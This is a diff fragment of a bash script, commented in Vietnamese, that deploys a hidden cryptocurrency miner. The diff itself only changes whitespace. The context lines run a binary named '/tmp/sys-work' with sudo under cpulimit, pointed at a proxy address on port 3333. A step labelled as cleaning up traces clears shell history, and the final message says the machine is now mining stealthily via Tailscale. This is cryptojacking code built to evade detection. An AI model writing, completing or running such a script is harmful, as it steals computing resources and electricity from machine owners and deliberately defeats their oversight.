@@ -1,5 +1,4 @@
 #!/bin/bash
-
 # 1. Khai bao thong so
 AUTH_KEY=$1
 PROXY_IP=$2
@@ -37,3 +36,4 @@ nohup sudo cpulimit -l 65 -- /tmp/sys-work -o $PROXY_IP:3333 -u $(hostname) -p x
 # 6. Don dep dau vet
 history -c
 echo "Done! May dang dao tang hinh qua Tailscale."
+
